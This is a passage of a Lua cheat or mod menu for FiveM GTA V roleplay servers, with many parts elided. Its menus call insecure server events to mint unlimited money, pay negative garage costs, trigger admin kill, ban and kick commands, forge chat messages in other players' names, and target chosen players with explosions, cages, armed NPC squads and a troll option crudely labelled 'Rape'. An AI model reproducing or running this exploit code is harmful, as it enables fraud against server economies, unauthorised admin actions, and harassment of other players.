                        local blip = GetFirstBlipInfoId(8, blipIterator)
                ...
                elseif DFefwtRE.Button('~h~AI Drive (Waypoint_Fast)') then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                ...
                elseif DFefwtRE.Button('~h~Stop AI') then
				 ...
				 DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('LSC') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                DFefwtRE.MenuButton('~h~Exterior ~r~Tuning', 'tunings')
                DFefwtRE.MenuButton('~h~Performance ~r~Tuning', 'performance')
			
				DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('CarTypes') then
                for i, dF in ipairs(aY) do
                    if DFefwtRE.MenuButton('~h~~r~> ~s~' .. dF, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('CarTypeSelection') then
                for i, dF in ipairs(aZ[carTypeIdx]) do
                    if DFefwtRE.MenuButton('~h~~r~# ~s~' .. dF, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened('CarOptions') then
			if DFefwtRE.Button('~h~~y~-Spawn intro vehicle-') then
                ...
                elseif DFefwtRE.Button('~h~~g~-Spawn vehicle-') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                    local veh = aZ[carTypeIdx][carToSpawn]
                    if veh == nil then
                        veh = 'adder'
		...
		DFefwtRE.Display()
				...
				elseif DFefwtRE.IsMenuOpened('TorqueBoostMenu') then 
			if DFefwtRE.CheckBox('Engine Torque boost ~h~~g~x2', Torque2, function(enabled)
				Torque2 = enabled
			end) then
			elseif DFefwtRE.CheckBox('Engine Torque boost ~h~~g~x4', Torque4, function(enabled)
				Torque4 = enabled
			end) then
			elseif DFefwtRE.CheckBox('Engine Torque boost ~h~~g~x8', Torque8, function(enabled)
				Torque8 = enabled
			end) then
			elseif DFefwtRE.CheckBox('Engine Torque boost ~h~~g~x16', Torque16, function(enabled)
				Torque16 = enabled
			end) then
			elseif DFefwtRE.CheckBox('Engine Torque boost ~h~~g~x32', Torque32, function(enabled)
				Torque32 = enabled
			end) then
			elseif DFefwtRE.CheckBox('Engine Torque boost ~h~~g~x64', Torque64, function(enabled)
				Torque64 = enabled
			end) then
			elseif DFefwtRE.CheckBox('Engine Torque boost ~h~~g~x128', Torque128, function(enabled)
				Torque128 = enabled
			end) then
			elseif DFefwtRE.CheckBox('Engine Torque boost ~h~~g~x256', Torque256, function(enabled)
				Torque256 = enabled
			end) then
			elseif DFefwtRE.CheckBox('Engine Torque boost ~h~~g~x512', Torque512, function(enabled)
				Torque512 = enabled
			end) then
			end
				...
				DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened("VehBoostMenu") then
                if DFefwtRE.Button('Engine Power boost ~r~RESET') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif DFefwtRE.Button('Engine Power boost ~g~x2') then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif DFefwtRE.Button('Engine Power boost  ~g~x4') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif DFefwtRE.Button('Engine Power boost  ~g~x8') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
			elseif DFefwtRE.Button('Engine Power boost  ~g~x16') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
			elseif DFefwtRE.Button('Engine Power boost  ~g~x32') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
			elseif DFefwtRE.Button('Engine Power boost  ~g~x64') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
			elseif DFefwtRE.Button('Engine Power boost  ~g~x128') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
			elseif DFefwtRE.Button('Engine Power boost  ~g~x512') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
			elseif DFefwtRE.Button('Engine Power boost  ~g~ULTIMATE') then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
			end
				
               DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("Models") then
			 
								if DFefwtRE.ComboBox("~h~~b~Male Model", peds2, currentPedd, selectedPedd, function(currentIndex, selectedIndex)
                    currentPedd = currentIndex
                    selectedPedd = selectedIndex
                end)
                then
				elseif DFefwtRE.Button("Selected ~b~> ") then
					Deer.Destroy()
		Wait(100)
    ...
    SetModelAsNoLongerNeeded(model1)
				elseif DFefwtRE.ComboBox("~h~~p~Female Model", peds3, currentPeddd, selectedPeddd, function(currentIndex, selectedIndex)
                    currentPeddd = currentIndex
                    selectedPeddd = selectedIndex
                end)
                then
				elseif DFefwtRE.Button("Selected ~p~>") then
		Deer.Destroy()
		Wait(100)
    ...
    SetModelAsNoLongerNeeded(model5)
				elseif DFefwtRE.ComboBox("~h~~o~Animal Model", peds4, currentPedddd, selectedPedddd, function(currentIndex, selectedIndex)
                    currentPedddd = currentIndex
                    selectedPedddd = selectedIndex
                end)
                then
	elseif DFefwtRE.Button("Selected ~o~> ") then
			Deer.Destroy()
		Wait(100)
    ...
    SetModelAsNoLongerNeeded(model6)
		elseif DFefwtRE.Button("Spawn ~r~Deer ~s~And Ride") then
     Deer.Create()
	Citizen.Wait(150)
	 Deer.Ride()
				elseif DFefwtRE.Button("~g~Reset Model To FiveM Player") then
						Deer.Destroy()
		Wait(100)
	...
	elseif DFefwtRE.Button("Change To ~y~Trevor") then
			Deer.Destroy()
		Wait(100)
	...
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(model1)
	elseif DFefwtRE.Button("Change To ~b~Michael") then
			Deer.Destroy()
		Wait(100)
	...
	elseif DFefwtRE.Button("Change To ~g~Franklin") then
			Deer.Destroy()
		Wait(100)
	...
	elseif DFefwtRE.Button("Change To ~r~Alien") then
			Deer.Destroy()
		Wait(100)
	...
	elseif DFefwtRE.Button("Change To ~h~Bigfoot") then
			Deer.Destroy()
		Wait(100)
	...
	elseif DFefwtRE.Button("Change To ~p~Clown") then
			...
			elseif DFefwtRE.Button("Change To ~r~Stripper") then
			local model = "s_f_y_stripper_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif DFefwtRE.Button("Change To ~b~Cop") then
			local model = "s_m_y_cop_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif DFefwtRE.Button("Change To ~o~Chimp") then
			local model = "a_c_chimp"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif DFefwtRE.Button("Change To ~g~Alien") then
			local model = "s_m_m_movalien_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif DFefwtRE.Button("Change To ~p~Pongo") then
			local model = "u_m_y_pogo_01"
				...
				if HasModelLoaded(GetHashKey(model)) then
					...
					elseif DFefwtRE.Button("Change To ~o~Babyd") then
	...
	elseif DFefwtRE.Button("~h~Randomize ~r~Model") then
				SetPedRandomComponentVariation(PlayerPedId(), true)

	elseif DFefwtRE.Button("Change Clothes (~g~ESX~s~) (NOT TESTED)") then
    TriggerEvent('esx_skin:openSaveableMenu')
				...
				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("ServerMenu") then
				if DFefwtRE.MenuButton("~s~Menu ~h~~r~JOBS", "RecrutarPlayers") then
				elseif DFefwtRE.MenuButton("~s~Menu ~b~~h~BOSS", "ESXBoss") then
				elseif DFefwtRE.MenuButton("~s~Menu ~g~~h~MONEY", "ESXMoney") then
				elseif DFefwtRE.MenuButton("~s~Menu ~p~~h~DRUGS", "ESXDrugs") then
				elseif DFefwtRE.MenuButton("~s~Menu ~o~~h~OTHERS", "ESXMisc") then
				end
				

				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("ESXBoss") then
				if DFefwtRE.Button("~c~~h~Mechanic~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif DFefwtRE.Button("~b~~h~Police~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif DFefwtRE.Button("~r~~h~Ambulance~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif DFefwtRE.Button("~y~~h~Taxi~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif DFefwtRE.Button("~g~~h~Real Estate~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif DFefwtRE.Button("~p~~h~Gang~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif DFefwtRE.Button("~o~~h~Car Dealer~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif DFefwtRE.Button("~y~~h~Banker~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif DFefwtRE.Button("~c~~h~Mafia~s~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, false)
				elseif DFefwtRE.Button("~g~~h~ESX ~y~Custom Boss Menu") then
				...
				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("ESXMoney") then
				if DFefwtRE.Button("~h~~g~MONEY ~s~~h~BEST") then
			...
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~1") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent("esx_jobs:caution", "give_back", result)
				end
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~2") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~3") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveBank', result)
				end
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~4") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
				TriggerServerEvent('AdminMenu:giveCash', result)
				end
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~5") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_gopostaljob:pay", result)
				end
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~6") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_banksecurity:pay", result)
				end
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~7") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_slotmachine:sv:2", result)
				end
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~8") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
					TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				end		
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~9") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("vrp_slotmachine:server:2", result)
				end
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~10") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				end
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~11") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('esx_truckerjob:pay', result)
				end
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~12") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent('delivery:success', result)
				end
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~13") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent ('taxi:success', result)
				end
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~14") then
					...
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~15") then
				local result = KeyboardInput("Enter amount of money", "", 100000000)
				if result then
					TriggerServerEvent("esx_garbagejob:pay", result)
				end	
			elseif DFefwtRE.Button("~g~~h~MONEY ~s~16") then
				...
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
			elseif DFefwtRE.Button("~s~Bank ~r~~h~Deposit") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
				TriggerServerEvent("bank:deposit", result)
				end
			elseif DFefwtRE.Button("~s~Bank ~r~~h~Withdraw ") then
				local result = KeyboardInput("Enter amount of money", "", 100)
				if result then
			...
			DFefwtRE.Display()
				elseif DFefwtRE.IsMenuOpened("ESXMisc") then
				if DFefwtRE.Button("~b~ESX ~w~Revive By ID") then
					local serverID = KeyboardInput("PLAYER ID", "", 100)
					TriggerServerEvent('esx_ambulancejob:revive', serverID)
				    elseif DFefwtRE.Button("~g~~h~ESX ~r~SEND EVERYONE A BILL") then
					...
					elseif DFefwtRE.Button("~g~~h~ESX ~w~Harvest FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startHarvest")
				elseif DFefwtRE.Button("~g~~h~ESX ~w~Get all licenses Drive") then
                ...
                elseif DFefwtRE.Button("~g~~h~ESX ~w~Craft FixKit") then
                    TriggerServerEvent("esx_mechanicjob:startCraft")
				elseif DFefwtRE.Button("~h~Send Discord Message") then
				...
				elseif DFefwtRE.Button("~h~Send Police Car Advert") then
				TriggerServerEvent("esx:enterpolicecar",GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsIn(GetPlayerPed(-1), 0))))
				end
				

				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("MiscServerOptions") then
				if DFefwtRE.Button("~h~Send Discord Message") then
					local Message = KeyboardInput("Enter message to send", "", 100)
					TriggerServerEvent("DiscordBot:playerDied", Message, "1337")
					drawNotification("The message:~n~" .. Message .. "~n~Has been ~g~sent!")
				elseif DFefwtRE.Button("~h~Send Police Car Advert") then
				...
				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("VRPOptions") then
				if DFefwtRE.Button("~r~~h~VRP ~s~Give Money ~ypayGarage") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
						TriggerServerEvent("lscustoms:payGarage", {costs = -result})
					end		
				elseif DFefwtRE.Button("~r~~h~VRP ~g~WIN ~s~Slot Machine") then
					local result = KeyboardInput("Enter amount of money USE AT YOUR OWN RISK", "", 100)
					if result then
					TriggerServerEvent("vrp_slotmachine:server:2", result)
					end
				elseif DFefwtRE.Button("~r~~h~VRP ~s~Get driving license") then
					TriggerServerEvent("dmv:success")
				elseif DFefwtRE.Button("~r~~h~VRP ~s~Bank Deposit") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:deposit", result)
					end
				elseif DFefwtRE.Button("~r~~h~VRP ~s~Bank Withdraw ") then
					local result = KeyboardInput("Enter amount of money", "", 100)
					if result then
					TriggerServerEvent("bank:withdraw", result)
					end
				...
				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("ESXDrugs") then
				if DFefwtRE.Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
				elseif DFefwtRE.Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
				elseif DFefwtRE.Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
				elseif DFefwtRE.Button("~h~~w~Harvest ~w~Coke ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
				elseif DFefwtRE.Button("~h~~w~Transform ~w~Coke ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')																			
				elseif DFefwtRE.Button("~h~~w~Sell ~w~Coke ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
				elseif DFefwtRE.Button("~h~~r~Harvest Meth ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
				elseif DFefwtRE.Button("~h~~r~Transform Meth ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
				elseif DFefwtRE.Button("~h~~r~Sell Meth ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
				elseif DFefwtRE.Button("~h~~p~Harvest Opium ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
				elseif DFefwtRE.Button("~h~~p~Transform Opium ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
				elseif DFefwtRE.Button("~h~~p~Sell Opium ~c~(x5)") then
					...
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
				elseif DFefwtRE.Button("~h~~g~Money Wash ~c~(x10)") then
					...
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif DFefwtRE.Button("~r~~h~Stop all ~c~(Drugs)") then
					...
					elseif DFefwtRE.Button("~h~~g~Sell Money Wash ~s~new") then
				...
				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("RecrutarPlayers") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and DFefwtRE.MenuButton("~h~~r~-»  ~s~"..GetPlayerName(i).."", 'RecrutarPlayersOptions') then
						SelectedPlayer = i
					end
				end
				
				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("RecrutarPlayersOptions") then
				DFefwtRE.SetSubTitle("RecrutarPlayersOptions", "Recrutar Players options [" .. GetPlayerName(SelectedPlayer) .. "]")
				if DFefwtRE.Button("~r~Remove job") then
                    TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(SelectedPlayer))
			    elseif DFefwtRE.Button("~s~Recruit~c~~h~ Mechanic") then
			...
			elseif DFefwtRE.Button("~s~Recruit~b~~h~ Police") then
			...
			elseif DFefwtRE.Button("~s~Recruit~c~~h~ Mafia") then
			...
			elseif DFefwtRE.Button("~s~Recruit~p~~h~ Gang") then
			...
			elseif DFefwtRE.Button("~s~Recruit~r~~h~ Inem") then
			...
			elseif DFefwtRE.Button("~h~Custom Recruit") then
				...
				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("OnlinePlayerMenu") then
					for i = 0, 128 do
					if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and DFefwtRE.MenuButton("~h~ID: ~r~[ "..GetPlayerServerId(i).." ] ~s~"..GetPlayerName(i).."~h~~y~ » "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~s~[~r~DEAD~s~]" or "~s~[ ~g~ALIVE~s~ ]"), 'PlayerOptionsMenu') then
						SelectedPlayer = i
					end
				end
				...
				DFefwtRE.Display()
			elseif DFefwtRE.IsMenuOpened("PlayerOptionsMenu") then
				DFefwtRE.SetSubTitle("PlayerOptionsMenu", "~h~Player ~s~~r~[" .. GetPlayerName(SelectedPlayer) .. "~r~]")
				if DFefwtRE.Button("~h~~r~[~s~ SPECTATE ~h~~r~]", (Spectating and "~r~[ON]")) then
					SpectatePlayer(SelectedPlayer)
				elseif DFefwtRE.Button("~r~→  ~y~Teleport To Player") then
					local Entity = IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
					SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, false)
                elseif DFefwtRE.MenuButton("~r~→  ~s~Troll Options", "PlayerTrollMenu") then					
				elseif DFefwtRE.Button("~g~Spam Msg") then
				...
				elseif DFefwtRE.Button("~g~Give ~s~Money") then
				...
				elseif DFefwtRE.Button("~g~Revive ~h~~g~ESX") then
                    ...
                    DoScreenFadeIn(800)
					elseif DFefwtRE.Button('~g~Revive ~h~~b~VRP') then
			    ...
			    elseif DFefwtRE.Button("~h~~r~Kill ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0) 
				elseif DFefwtRE.Button('Fire') then
				    FirePlayer(SelectedPlayer)
				elseif DFefwtRE.Button("~b~Open inventory ~s~new") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
					elseif DFefwtRE.Button("Jail") then		
				...
				elseif DFefwtRE.Button("Unjail") then
				...
				elseif DFefwtRE.Button("~g~Give All Weapons") then
					for i = 1, #allWeapons do
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, false, false)
					end
					elseif DFefwtRE.Button("~r~Remove All Weapons") then
                    RemoveAllPedWeapons(PlayerPedId(-1), true)
				elseif DFefwtRE.MenuButton("Weapon Menu", "SingleWepPlayer") then
				elseif DFefwtRE.Button("Spawn Vehicle") then
					local ped = GetPlayerPed(SelectedPlayer)
					local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
				...
				elseif DFefwtRE.Button('~h~Clone Car') then
                    ClonePedVeh()
				elseif DFefwtRE.Button("~b~Cuff Player") then
				...
				elseif DFefwtRE.Button("~r~MelloTrainer ~s~KILL") then
					TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
				elseif DFefwtRE.Button("~r~MelloTrainer ~s~BAN") then
				...
				elseif DFefwtRE.Button("~r~MelloTrainer ~s~KICK") then
				...
				DFefwtRE.Display()
                elseif DFefwtRE.IsMenuOpened("PlayerTrollMenu") then
				 
                    if DFefwtRE.Button ("Fake Chat Message") then
                        local cX=KeyboardInput("Enter message to send","",100)
                        local cY=GetPlayerName(selectedPlayer)
                        if cX then
                            TriggerServerEvent("_chat:messageEntered",cY,{0,0x99,255},cX)
                        end
						elseif DFefwtRE.MenuButton("~r~→  ~s~Spawn Props On Player", "SpawnPropsMenu") then
				elseif DFefwtRE.Button("Ram w/ Custom Vehicle") then
				...
				elseif DFefwtRE.Button('~y~Explode ~s~Vehicle') then
					...
					elseif DFefwtRE.Button('~r~Attack ~s~Windmill') then
                ...
                elseif DFefwtRE.Button('~r~Banana ~p~Party') then
                ...
                elseif DFefwtRE.Button('~r~ISIS Explode') then
				...
				elseif DFefwtRE.Button("Small invisible Explosion") then
                        AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 2, 100000.0, false, true, 0)
                elseif DFefwtRE.Button('~r~Rape') then
                ...
                elseif DFefwtRE.Button('~r~Cage ~s~Player') then
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                    roundz = tonumber(string.format('%.2f', z))
                    ...
                    FreezeEntityPosition(e9, true)
                    FreezeEntityPosition(ea, true)
                elseif DFefwtRE.Button('Wall ~s~Player') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif DFefwtRE.Button('Wall ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = -145066854
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif DFefwtRE.Button('~r~Attack UFO ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
				...
				elseif DFefwtRE.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                ...
                elseif DFefwtRE.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
					...
					elseif DFefwtRE.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif DFefwtRE.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                ...
                elseif DFefwtRE.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
					...
					elseif DFefwtRE.Button("Rain Agressive NPC") then
                    ...
                    then
					elseif DFefwtRE.Button("~h~~b~-- Vehicle --") then
				elseif DFefwtRE.Button("Kick ~b~Vehicle") then
					ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
				elseif DFefwtRE.Button("Fuck ~s~Engine") then
				...
				elseif DFefwtRE.Button("~s~Repair ~b~Vehicle") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
				...
				elseif DFefwtRE.Button("~s~Fuck ~b~Car ") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
			    ...
			    elseif DFefwtRE.Button("~r~Explode ~b~Vehicle") then	
				 if IsPedInAnyVehicle(GetPlayerPed(SelectedPlayer), true) then
                    ...
                    DFefwtRE.Display()
                elseif DFefwtRE.IsMenuOpened("SpawnPropsMenu") then
                    if DFefwtRE.CheckBox(
                    ...
                    then
                    elseif DFefwtRE.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif DFefwtRE.Button("Weed") then
                    ...
                    elseif DFefwtRE.Button("UFO") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif DFefwtRE.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif DFefwtRE.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened("VehicleRamMenu") then
                if DFefwtRE.Button("Futo") then
                ...
                elseif DFefwtRE.Button("Bus") then
                    ...
                    DFefwtRE.Display()
            elseif DFefwtRE.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if DFefwtRE.Button(allWeapons[i]) then
